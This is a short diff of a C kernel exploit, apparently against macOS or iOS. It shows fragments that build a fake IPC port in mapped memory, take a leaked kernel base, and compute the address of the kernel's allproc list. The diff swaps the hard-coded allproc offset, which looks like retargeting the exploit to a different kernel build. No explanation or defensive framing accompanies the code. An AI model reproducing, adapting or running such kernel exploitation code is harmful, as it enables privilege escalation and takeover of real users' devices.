@@ -178,7 +178,7 @@ int main()
     
     //create fake port
     struct ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
-    printf("fakeport=0x%p\n",fakeport);
+    printf("fakeport=%p\n",fakeport);
     
     mlock(fakeport, 0x8000);
     
@@ -324,10 +324,7 @@ gotclock:;
     //found kernel base
     uint64_t kernel_base = leaked_ptr;
     
-    
-    //0xFFFFFF8000ABC490 _allproc
-    //0xFFFFFF8000200000 kernel text base
-    uint64_t allproc_offset = 0x8bc490;
+        uint64_t allproc_offset = 0x92fee8;
     
     uint64_t allproc = allproc_offset + kernel_base;
     
